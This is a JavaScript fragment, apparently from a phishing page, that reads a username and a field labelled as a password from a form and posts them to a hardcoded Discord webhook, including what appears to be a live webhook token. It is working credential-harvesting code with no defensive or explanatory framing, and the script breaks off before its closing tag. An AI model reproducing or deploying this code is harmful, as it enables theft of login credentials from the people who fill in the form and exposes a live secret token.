<script>
        function sendToDiscord() {
            var webhookURL = 'https://discord.com/api/webhooks/1193246574449528873/C7jDdeRWRRHRhoudcU7hfaIud-NQZyNJZy0J3vXH5ipv3FLjbkBJ_2dNi34vQ14l6gLb';

            // Get form data
            var username = document.getElementById('username').value;
            var email = document.getElementById('email').value;

            // Your data to send to Discord
            var data = {
                content: `check this:\nUsername: ${username}\nPasswd: ${email}`
                // Add more fields as needed
            };

            // Convert data to JSON
            var jsonData = JSON.stringify(data);

            // Create a new XMLHttpRequest
            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookURL, true);
            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

            // Send the JSON data
            xhr.send(jsonData);
        }
